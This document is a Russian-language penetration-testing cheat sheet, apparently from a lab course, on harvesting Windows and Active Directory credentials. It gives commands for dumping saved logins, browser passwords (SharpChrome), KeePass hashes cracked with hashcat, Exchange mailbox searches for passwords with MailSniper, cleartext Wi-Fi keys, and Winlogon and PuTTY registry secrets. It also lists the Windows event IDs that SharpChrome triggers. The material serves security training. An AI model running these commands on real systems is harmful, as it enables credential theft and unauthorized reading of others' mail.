#windows #creds #AD 

# 1) Просмотр загруженных учетных данных

Они используются для подключения по протоколу `RDP`, а также через `runas`
```powershell
cmdkey /list
```


# 2) Учетные данные браузера

**SharpChrome**
```powershell
.\SharpChrome.exe logins /unprotect /nowrap /showall
```
<font color="#c00000">! Это событие вызывает активности: </font>
- `4688`(создание процесса) 
- `16385`(Активность DPAPI)
- `4662`(доступ к объектам) 
- `4663`(доступ к файлам)

# 3) Менеджеры паролей

### KeePass
Файл менеджера паролей - `.kdbx`

Локально извлекаем хэш мастер пароля
```bash
python3 keepass2john.py ILFREIGHT_Help_Desk.kdbx 
```

Брутим локально
```
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```


# 4)  Электронная почта

Если аккаунт подключен к Microsoft Exchange, то можем выполнить поиск учеток там

### 1. Поиск паролей по всей почте (Invoke-SelfSearch)

```powershell
Import-Module .\MailSniper.ps1
Invoke-SelfSearch -Mailbox user@domain.local -ExchHostname exchange.domain.local -Remote
```

### 2. Сбор списка всех email-адресов домена (Get-GlobalAddressList)

```powershell
Get-GlobalAddressList -ExchHostname exchange.domain.local -UserName user -Password pass -OutFile emails.txt
```

### 3. Поиск паролей в OWA (через HTTP)

```powershell
Invoke-SelfSearch -Mailbox user@domain.local -Remote -OutFile results.txt -Folder Inbox -OWA
```

### 4. Чтение писем другого пользователя (Invoke-MailSniper)

```powershell
Invoke-MailSniper -Mailbox victim@domain.local -ExchHostname exchange.domain.local -Remote -Terms "VPN","password","secret"
```

# 5) Пароли от Wi-Fi

Просмотр сохраненных беспроводных сетей
```cmd
netsh wlan show profile
```

Восстановление сохраненных паролей беспроводной сети
```cmd
netsh wlan show profile ilfreight_corp key=clear
```


# 6) Хранение паролей в открытом виде в реестре

Некоторые программы и настройки Windows могут приводить к сохранению паролей или других данных в реестре в открытом виде

В Windows Функция автоматического входа позволяет пользователю настроить операционную систему Windows для автоматического входа в определенную учетную запись без необходимости ручного ввода имени пользователя и пароля при каждом запуске. Однако после настройки имя пользователя и пароль сохраняются в реестре в открытом виде

Перечисление Winlogon
```powershell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
 
 Перечисление сессий
```powershell
reg query "HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions"
```

Просмотр обнаруженной сессии
```powershell
reg query "HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh"
```